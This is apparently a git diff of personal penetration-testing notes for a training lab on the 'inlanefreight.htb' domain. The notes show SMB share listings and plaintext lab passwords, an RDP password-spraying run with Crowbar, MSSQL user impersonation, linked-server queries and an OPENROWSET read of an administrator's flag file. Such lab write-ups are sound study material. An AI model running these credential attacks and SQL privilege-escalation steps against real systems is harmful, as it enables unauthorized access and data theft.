@@ -5,9 +5,6 @@
 inlanefreight.htb
 ```
 
-
-
-
 **IP**
 ```
 10.129.54.68
@@ -523,7 +520,7 @@ Password123!
 SecureLocationforPasswordsd123!!
 ```
 
-John's Folder:
+John's Folder: 
 ```
 smb: \IT\John\> dir
   .                                   D        0  Thu Apr 21 17:15:09 2022
@@ -532,9 +529,8 @@ smb: \IT\John\> dir
   notes.txt                           A      164  Thu Apr 21 17:13:40 2022
   secrets.txt                         A       99  Thu Apr 21 17:15:55 2022
 
-                7706623 blocks of size 4096. 3167182 blocks available
+7706623 blocks of size 4096. 3167182 blocks available
 smb: \IT\John\> 
-
 ```
 
 Content of John's files:
@@ -564,7 +560,7 @@ smb: \IT\Simon\> dir
   ..                                  D        0  Thu Apr 21 17:16:07 2022
   random.txt                          A       94  Thu Apr 21 17:16:48 2022
 
-                7706623 blocks of size 4096. 3167182 blocks available
+7706623 blocks of size 4096. 3167182 blocks available
 
 ```
 
@@ -579,4 +575,70 @@ JT9ads02lasSA@
 Kaksd032klasdA#
 LKads9kasd0-@  
 ```
+
+Fiona's creds are actually ==Windows== credentials!!! 
+
+### RDP w/ Fiona's Password List
+
+First we need to determine which password is Fiona's, using the cred.txt file and the ==Crowbar==, the RDP passwd cracking tool
+
+```
+crowbar -b rdp -s 10.129.203.10/32 -u fiona -C creds.txt
+2024-01-15 09:00:28 START
+2024-01-15 09:00:28 Crowbar v0.4.2
+2024-01-15 09:00:28 Trying 10.129.203.10:3389
+2024-01-15 09:00:30 RDP-SUCCESS : 10.129.203.10:3389 - fiona:48Ns72!bns74@S84NNNSl
+2024-01-15 09:00:30 STOP
+```
+
+**Fiona's Passwd**
+```
+48Ns72!bns74@S84NNNSl
+```
+
+### Impersonate the user John
+
+We're impersonating John because he has admin privileges. First step is to log into the database
+```
+sqlcmd
+```
+
+Going through each database. Fiona does not have permission to view the ==model== db, same thing for the ==TestAppDB==. 
+
+**Identify who you can impersonate**
+
+![[Pasted image 20240115120454.png]]
+
+The two users we can impersonate are john and simon!
+
+**Verifying Fiona's SA rights**
+![[Pasted image 20240115123314.png]]
+
+Fiona does have SA rights but we may still be able to impersonate the user, john
+
+![[Pasted image 20240115123849.png]]
+
+### Identify linked Servers
+![[Pasted image 20240115124926.png]]
+
+1 means the SQLEXPRESS server, is a remote server. And 0 means the LOCAL.TEST.LINKED.SRV is a linked server
+
+Now I need to identify the user used for the connection and its privileges using the following command. The linked server is specified between square brackets:
+```cmd-session
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+```
+
+![[Pasted image 20240115125618.png]]
+
+Read the contents of the flag.txt on the Administrators Desktop
+```cmd-session
+SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/flag.txt', SINGLE_CLOB) AS Contents
+```
+
+
+
+
+
+
+
 
